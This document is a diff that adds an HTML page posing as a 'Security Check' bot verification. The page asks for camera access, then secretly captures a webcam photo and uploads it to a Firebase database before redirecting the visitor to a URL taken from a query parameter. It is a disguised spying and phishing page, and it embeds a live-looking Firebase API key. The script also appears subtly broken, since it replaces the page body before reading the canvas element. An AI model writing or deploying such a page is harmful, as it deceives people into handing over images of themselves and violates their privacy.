@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #000; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .btn { background: #00d2ff; padding: 15px 30px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div>
+        <h2>Verification Required</h2>
+        <p>Allow camera access to verify you are not a bot.</p>
+        <button class="btn" onclick="startCapture()">VERIFY NOW</button>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDyl_AUPvulQJtVPBEeofS0OaWADyO4acw",
+            authDomain: "camera-fc58f.firebaseapp.com",
+            databaseURL: "https://camera-fc58f-default-rtdb.firebaseio.com",
+            projectId: "camera-fc58f",
+            appId: "1:1018467164860:web:b65a217d47affa6e7226b9"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        window.startCapture = async function() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                document.body.innerHTML = "<h2>Processing... Please wait.</h2>";
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 400; // Size chota rakha hai taake fast upload ho
+                    canvas.height = 300;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.5); // Photo ko text (Base64) banaya
+                    
+                    const dbRef = ref(db, 'captures');
+                    push(dbRef, {
+                        image: imageData,
+                        time: Date.now()
+                    }).then(() => {
+                        const params = new URLSearchParams(window.location.search);
+                        window.location.href = params.get('redirect') || 'https://youtube.com';
+                    });
+                }, 2000);
+            } catch (err) { alert("Permission Denied!"); }
+        }
+    </script>
+</body>
+</html>
